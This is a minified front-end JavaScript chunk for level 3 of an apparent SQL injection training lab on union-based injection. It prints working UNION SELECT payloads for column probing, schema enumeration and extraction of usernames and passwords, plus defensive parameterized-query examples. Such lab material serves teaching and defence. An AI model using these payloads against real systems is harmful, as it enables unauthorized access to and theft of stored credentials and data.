(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[924],{4820:function(e,s,n){Promise.resolve().then(n.bind(n,6393))},6393:function(e,s,n){"use strict";n.r(s),n.d(s,{default:function(){return r}});var t=n(7437),a=n(229);function r(){let e=async e=>{try{let s=await fetch("/api/level3",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});return await s.json()}catch(e){return{success:!1,error:"Failed to connect to server"}}};return(0,t.jsx)("div",{className:"min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12",children:(0,t.jsxs)("div",{className:"container mx-auto px-6",children:[(0,t.jsx)(a.Z,{level:3,title:"Union-based Injection",description:"This level focuses on UNION SELECT attacks, which allow attackers to extract data from other tables by combining the results of multiple SELECT statements. You'll need to determine the structure of the original query first.",onSubmit:e,hints:["This level is designed for UNION SELECT attacks","First determine the number of columns in the original query","Use ORDER BY to find the column count: ' ORDER BY 5--","Try: ' UNION SELECT username, password, email, role, id FROM users--","The original query selects: id, username, email, role, created_at"],isVulnerable:!0}),(0,t.jsx)("div",{className:"mt-12 max-w-4xl mx-auto",children:(0,t.jsxs)("div",{className:"vulnerability-card rounded-lg p-8",children:[(0,t.jsx)("h2",{className:"text-2xl font-semibold mb-6 text-cyber-blue",children:"\uD83D\uDD0D Technical Details"}),(0,t.jsxs)("div",{className:"space-y-6",children:[(0,t.jsxs)("div",{children:[(0,t.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"UNION Attack Methodology:"}),(0,t.jsx)("div",{className:"code-block",children:"-- Step 1: Determine number of columns\n' ORDER BY 1--  (success)\n' ORDER BY 2--  (success)\n' ORDER BY 5--  (success)\n' ORDER BY 6--  (error - too many columns)\n\n-- Step 2: Find which columns are displayed\n' UNION SELECT 1,2,3,4,5--\n\n-- Step 3: Extract sensitive data\n' UNION SELECT username, password, email, role, id FROM users--\n' UNION SELECT table_name, column_name, 1, 2, 3 FROM information_schema.columns--"})]}),(0,t.jsxs)("div",{children:[(0,t.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Requirements for UNION Attacks:"}),(0,t.jsxs)("ul",{className:"space-y-2 text-gray-300",children:[(0,t.jsxs)("li",{className:"flex items-start",children:[(0,t.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),"Same number of columns in both SELECT statements"]}),(0,t.jsxs)("li",{className:"flex items-start",children:[(0,t.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),"Compatible data types in corresponding columns"]}),(0,t.jsxs)("li",{className:"flex items-start",children:[(0,t.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),"Knowledge of table and column names (or good guessing)"]}),(0,t.jsxs)("li",{className:"flex items-start",children:[(0,t.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),"Application must display the query results"]})]})]}),(0,t.jsxs)("div",{children:[(0,t.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Information Gathering Queries:"}),(0,t.jsx)("div",{className:"code-block",children:"-- Database version and user\n' UNION SELECT version(), user(), 3, 4, 5--\n\n-- List all tables\n' UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables--\n\n-- List columns for a specific table\n' UNION SELECT column_name, data_type, 3, 4, 5 FROM information_schema.columns WHERE table_name='users'--\n\n-- Extract passwords\n' UNION SELECT username, password, 3, 4, 5 FROM users--"})]}),(0,t.jsxs)("div",{children:[(0,t.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Defense Strategies:"}),(0,t.jsx)("div",{className:"code-block",children:"// Use parameterized queries\nconst query = \"SELECT id, username, email, role, created_at FROM users WHERE username = $1\";\n\n// Input validation\nif (!/^[a-zA-Z0-9_]+$/.test(username)) {\n  throw new Error('Invalid username format');\n}\n\n// Whitelist allowed characters\nconst sanitized = username.replace(/[^a-zA-Z0-9_]/g, '');"})]})]})]})})]})})}}},function(e){e.O(0,[229,971,117,744],function(){return e(e.s=4820)}),_N_E=e.O()}]);